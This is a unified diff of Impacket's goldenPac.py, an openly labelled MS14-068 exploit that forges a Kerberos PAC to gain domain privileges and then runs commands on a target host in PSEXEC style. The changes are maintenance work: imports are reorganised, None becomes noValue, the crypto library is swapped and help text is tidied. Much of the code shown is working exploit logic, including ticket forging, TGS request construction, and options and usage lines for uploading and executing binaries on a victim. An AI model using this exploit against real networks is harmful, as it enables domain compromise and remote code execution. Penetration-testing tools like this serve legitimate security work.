@@ -1,5 +1,5 @@
-#!/usr/bin/python
-# Copyright (c) 2003-2016 CORE Security Technologies
+#!/usr/bin/env python
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -29,249 +29,35 @@
 #       to the hosts file or use the -dc-ip and -target-ip parameters
 #
 
+import cmd
+import logging
+import os
 import random
 import string
-import logging
+import time
 from binascii import unhexlify
+from threading import Thread, Lock
 
-from impacket.examples import logger
-from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRUniConformantArray, NDRPOINTER
-from impacket.dcerpc.v5.dtypes import ULONG, RPC_SID, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT, MAXIMUM_ALLOWED
-from impacket.dcerpc.v5.nrpc import USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY, PRPC_UNICODE_STRING_ARRAY, MSRPC_UUID_NRPC, hDsrGetDcNameEx
-from impacket.dcerpc.v5.rpcrt import TypeSerialization1, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, hLsarOpenPolicy2, POLICY_LOOKUP_NAMES
-from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS
 from impacket.dcerpc.v5 import epm
 from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, \
     DRS_EXTENSIONS_INT, DRS_EXT_GETCHGREQ_V6, DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREQ_V8, DRS_EXT_STRONG_ENCRYPTION, \
-    NULLGUID, DRS_EXT_RECYCLE_BIN
+    NULLGUID
+from impacket.dcerpc.v5.dtypes import RPC_SID, MAXIMUM_ALLOWED
+from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS
+from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, hLsarOpenPolicy2, POLICY_LOOKUP_NAMES
+from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
+from impacket.dcerpc.v5.rpcrt import TypeSerialization1, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.krb5.pac import PKERB_VALIDATION_INFO, KERB_VALIDATION_INFO, KERB_SID_AND_ATTRIBUTES, PAC_CLIENT_INFO, \
+    PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, \
+    PAC_PRIVSVR_CHECKSUM, PACTYPE
+from impacket.examples import logger
+from impacket.examples import remcomsvc, serviceinstall
+from impacket.smbconnection import SMBConnection, smb
 from impacket.structure import Structure
-
-################################################################################
-# CONSTANTS
-################################################################################
-# From http://msdn.microsoft.com/en-us/library/aa302203.aspx#msdn_pac_credentials
-# and http://diswww.mit.edu/menelaus.mit.edu/cvs-krb5/25862
-PAC_LOGON_INFO       = 1
-PAC_CREDENTIALS_INFO = 2
-PAC_SERVER_CHECKSUM  = 6
-PAC_PRIVSVR_CHECKSUM = 7
-PAC_CLIENT_INFO_TYPE = 10
-PAC_DELEGATION_INFO  = 11
-PAC_UPN_DNS_INFO     = 12
-
-################################################################################
-# STRUCTURES
-################################################################################
-
-PISID = PRPC_SID
-
-# 2.2.1 KERB_SID_AND_ATTRIBUTES
-class KERB_SID_AND_ATTRIBUTES(NDRSTRUCT):
-    structure = (
-        ('Sid', PISID),
-        ('Attributes', ULONG),
-    )
-
-class KERB_SID_AND_ATTRIBUTES_ARRAY(NDRUniConformantArray):
-    item = KERB_SID_AND_ATTRIBUTES
-
-class PKERB_SID_AND_ATTRIBUTES_ARRAY(NDRPOINTER):
-    referent = (
-        ('Data', KERB_SID_AND_ATTRIBUTES_ARRAY),
-    )
-
-# 2.2.2 GROUP_MEMBERSHIP
-from impacket.dcerpc.v5.nrpc import PGROUP_MEMBERSHIP_ARRAY
-
-# 2.2.3 DOMAIN_GROUP_MEMBERSHIP
-class DOMAIN_GROUP_MEMBERSHIP(NDRSTRUCT):
-    structure = (
-        ('DomainId', PISID),
-        ('GroupCount', ULONG),
-        ('GroupIds', PGROUP_MEMBERSHIP_ARRAY),
-    )
-
-class DOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRUniConformantArray):
-    item = DOMAIN_GROUP_MEMBERSHIP
-
-class PDOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRPOINTER):
-    referent = (
-        ('Data', KERB_SID_AND_ATTRIBUTES_ARRAY),
-    )
-
-# 2.3 PACTYPE
-class PACTYPE(Structure):
-    structure = (
-        ('cBuffers', '<L=0'),
-        ('Version', '<L=0'),
-        ('Buffers', ':'), 
-    )
-
-# 2.4 PAC_INFO_BUFFER
-class PAC_INFO_BUFFER(Structure):
-    structure = (
-        ('ulType', '<L=0'),
-        ('cbBufferSize', '<L=0'),
-        ('Offset', '<Q=0'), 
-    )
-
-# 2.5 KERB_VALIDATION_INFO
-class KERB_VALIDATION_INFO(NDRSTRUCT):
-    structure = (
-        ('LogonTime', FILETIME),
-        ('LogoffTime', FILETIME),
-        ('KickOffTime', FILETIME),
-        ('PasswordLastSet', FILETIME),
-        ('PasswordCanChange', FILETIME),
-        ('PasswordMustChange', FILETIME),
-        ('EffectiveName', RPC_UNICODE_STRING),
-        ('FullName', RPC_UNICODE_STRING),
-        ('LogonScript', RPC_UNICODE_STRING),
-        ('ProfilePath', RPC_UNICODE_STRING),
-        ('HomeDirectory', RPC_UNICODE_STRING),
-        ('HomeDirectoryDrive', RPC_UNICODE_STRING),
-        ('LogonCount', USHORT),
-        ('BadPasswordCount', USHORT),
-        ('UserId', ULONG),
-        ('PrimaryGroupId', ULONG),
-        ('GroupCount', ULONG),
-        ('GroupIds', PGROUP_MEMBERSHIP_ARRAY),
-        ('UserFlags', ULONG),
-        ('UserSessionKey', USER_SESSION_KEY),
-        ('LogonServer', RPC_UNICODE_STRING),
-        ('LogonDomainName', RPC_UNICODE_STRING),
-        ('LogonDomainId', PRPC_SID),
-
-        # Also called Reserved1
-        ('LMKey', CHAR_FIXED_8_ARRAY),
-
-        ('UserAccountControl', ULONG),
-        ('SubAuthStatus', ULONG),
-        ('LastSuccessfulILogon', FILETIME),
-        ('LastFailedILogon', FILETIME),
-        ('FailedILogonCount', ULONG),
-        ('Reserved3', ULONG),
-
-        ('SidCount', ULONG),
-        #('ExtraSids', PNETLOGON_SID_AND_ATTRIBUTES_ARRAY),
-        ('ExtraSids', PKERB_SID_AND_ATTRIBUTES_ARRAY),
-        ('ResourceGroupDomainSid', PISID),
-        ('ResourceGroupCount', ULONG),
-        ('ResourceGroupIds', PGROUP_MEMBERSHIP_ARRAY),
-    )
-
-class PKERB_VALIDATION_INFO(NDRPOINTER):
-    referent = (
-        ('Data', KERB_VALIDATION_INFO),
-    )
-
-# 2.6.1 PAC_CREDENTIAL_INFO
-class PAC_CREDENTIAL_INFO(Structure):
-    structure = (
-        ('Version', '<L=0'),
-        ('EncryptionType', '<L=0'),
-        ('SerializedData', ':'), 
-    )
-
-# 2.6.3 SECPKG_SUPPLEMENTAL_CRED
-class SECPKG_SUPPLEMENTAL_CRED(NDRSTRUCT):
-    structure = (
-        ('PackageName', RPC_UNICODE_STRING),
-        ('CredentialSize', ULONG),
-        ('Credentials', PUCHAR_ARRAY),
-    )
-
-class SECPKG_SUPPLEMENTAL_CRED_ARRAY(NDRUniConformantArray):
-    item = SECPKG_SUPPLEMENTAL_CRED
-
-# 2.6.2 PAC_CREDENTIAL_DATA
-class PAC_CREDENTIAL_DATA(NDRSTRUCT):
-    structure = (
-        ('CredentialCount', ULONG),
-        ('Credentials', SECPKG_SUPPLEMENTAL_CRED_ARRAY),
-    )
-
-# 2.6.4 NTLM_SUPPLEMENTAL_CREDENTIAL
-class NTLM_SUPPLEMENTAL_CREDENTIAL(NDRSTRUCT):
-    structure = (
-        ('Version', ULONG),
-        ('Flags', ULONG),
-        ('LmPassword', '16s=""'),
-        ('NtPassword', '16s=""'),
-    )
-
-# 2.7 PAC_CLIENT_INFO
-class PAC_CLIENT_INFO(Structure):
-    structure = (
-        ('ClientId', '<Q=0'),
-        ('NameLength', '<H=0'),
-        ('_Name', '_-Name', 'self["NameLength"]'), 
-        ('Name', ':'), 
-    )
-
-# 2.8 PAC_SIGNATURE_DATA
-class PAC_SIGNATURE_DATA(Structure):
-    structure = (
-        ('SignatureType', '<L=0'),
-        ('Signature', ':'),
-    )
-
-# 2.9 Constrained Delegation Information - S4U_DELEGATION_INFO
-class S4U_DELEGATION_INFO(NDRSTRUCT):
-    structure = (
-        ('S4U2proxyTarget', RPC_UNICODE_STRING),
-        ('TransitedListSize', ULONG),
-        ('S4UTransitedServices', PRPC_UNICODE_STRING_ARRAY ),
-    )
-
-# 2.10 UPN_DNS_INFO
-class UPN_DNS_INFO(Structure):
-    structure = (
-        ('UpnLength', '<H=0'),
-        ('UpnOffset', '<H=0'),
-        ('DnsDomainNameLength', '<H=0'),
-        ('DnsDomainNameOffset', '<H=0'),
-        ('Flags', '<L=0'),
-    )
-
-# 2.11 PAC_CLIENT_CLAIMS_INFO
-class PAC_CLIENT_CLAIMS_INFO(Structure):
-    structure = (
-        ('Claims', ':'),
-    )
-
-# 2.12 PAC_DEVICE_INFO
-class PAC_DEVICE_INFO(NDRSTRUCT):
-    structure = (
-        ('UserId', ULONG),
-        ('PrimaryGroupId', ULONG),
-        ('AccountDomainId', PISID ),
-        ('AccountGroupCount', ULONG ),
-        ('AccountGroupIds', PGROUP_MEMBERSHIP_ARRAY ),
-        ('SidCount', ULONG ),
-        ('ExtraSids', PKERB_SID_AND_ATTRIBUTES_ARRAY ),
-        ('DomainGroupCount', ULONG ),
-        ('DomainGroup', PDOMAIN_GROUP_MEMBERSHIP_ARRAY ),
-    )
-
-# 2.13 PAC_DEVICE_CLAIMS_INFO
-class PAC_DEVICE_CLAIMS_INFO(Structure):
-    structure = (
-        ('Claims', ':'),
-    )
 
 ################################################################################
 # HELPER FUNCTIONS
 ################################################################################
-
-import os
-import cmd
-import time
-from impacket.smbconnection import SMBConnection, smb
-from impacket.structure import Structure
-from threading import Thread, Lock
-from impacket.examples import remcomsvc, serviceinstall
 
 class RemComMessage(Structure):
     structure = (
@@ -395,7 +181,8 @@ class PSEXEC:
 
         except SystemExit:
             raise
-        except:
+        except Exception as e:
+            logging.debug(str(e))
             if unInstalled is False:
                 installService.uninstall()
                 if self.__copyFile is not None:
@@ -416,8 +203,7 @@ class PSEXEC:
                 pass
 
         if tries == 0:
-            logging.critical('Pipe not ready, aborting')
-            raise
+            raise Exception('Pipe not ready, aborting')
 
         fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)
 
@@ -873,7 +659,7 @@ class MS14_068:
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
-        authorizationData[0] = None
+        authorizationData[0] = noValue
         authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
         authorizationData[0]['ad-data'] = str(pacType)
         return encoder.encode(authorizationData)
@@ -890,7 +676,7 @@ class MS14_068:
 
         # Now put the goldenPac inside the AuthorizationData AD_IF_RELEVANT
         ifRelevant = AD_IF_RELEVANT()
-        ifRelevant[0] = None
+        ifRelevant[0] = noValue
         ifRelevant[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
         ifRelevant[0]['ad-data'] = goldenPAC
 
@@ -918,7 +704,7 @@ class MS14_068:
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
         seq_set_iter(reqBody, 'etype', (cipher.enctype,))
-        reqBody['enc-authorization-data'] = None
+        reqBody['enc-authorization-data'] = noValue
         reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
 
@@ -951,7 +737,7 @@ class MS14_068:
         # key (Section 5.5.1)
         encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
 
-        apReq['authenticator'] = None
+        apReq['authenticator'] = noValue
         apReq['authenticator']['etype'] = cipher.enctype
         apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
@@ -959,8 +745,8 @@ class MS14_068:
 
         tgsReq['pvno'] =  5
         tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
-        tgsReq['padata'] = None
-        tgsReq['padata'][0] = None
+        tgsReq['padata'] = noValue
+        tgsReq['padata'][0] = noValue
         tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
         tgsReq['padata'][0]['padata-value'] = encodedApReq
 
@@ -968,7 +754,7 @@ class MS14_068:
         pacRequest['include-pac'] = False
         encodedPacRequest = encoder.encode(pacRequest)
 
-        tgsReq['padata'][1] = None
+        tgsReq['padata'][1] = noValue
         tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
         tgsReq['padata'][1]['padata-value'] = encodedPacRequest
 
@@ -1242,6 +1028,7 @@ if __name__ == '__main__':
     import sys
     try:
         import pyasn1
+        from pyasn1.type.univ import noValue
     except ImportError:
          logging.critical('This module needs pyasn1 installed')
          logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
@@ -1264,25 +1051,29 @@ if __name__ == '__main__':
     from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
         SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
     from pyasn1.codec.der import decoder, encoder
-    from Crypto.Hash import MD5
+    from Cryptodome.Hash import MD5
 
     print version.BANNER
 
     parser = argparse.ArgumentParser(add_help=True,
-                                     description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.")
+                                     description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
+                                                 "target or saves the TGT for later use.")
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('command', nargs='*', default=' ',
-                        help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
+                        help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to '
+                             'cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
     parser.add_argument('-c', action='store', metavar="pathname",
                         help='uploads the filename for later execution, arguments are passed in the command option')
     parser.add_argument('-w', action='store', metavar="pathname",
                         help='writes the golden ticket in CCache format into the <pathname> file')
     parser.add_argument('-dc-ip', action='store', metavar="ip address",
-                        help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use the domain part (FQDN) specified in the target parameter')
+                        help='IP Address of the domain controller (needed to get the user''s SID). If omitted it will use '
+                             'the domain part (FQDN) specified in the target parameter')
     parser.add_argument('-target-ip', action='store', metavar="ip address",
-                        help='IP Address of the target host you want to attack. If ommited it will use the targetName parameter')
+                        help='IP Address of the target host you want to attack. If omitted it will use the targetName '
+                             'parameter')
 
     group = parser.add_argument_group('authentication')
 
@@ -1294,7 +1085,7 @@ if __name__ == '__main__':
         print "\tthe password will be asked, or\n"
         print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n"
         print "\tif domain.net and/or domain-machine do not resolve, add them"
-        print "\tto the hosts file or explicity specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
+        print "\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
         print "\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n"
         print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
         print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
@@ -1335,7 +1126,8 @@ if __name__ == '__main__':
     try:
         dumper.exploit()
     except Exception, e:
-        #import traceback
-        #print traceback.print_exc()
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
         logging.critical(str(e))
 
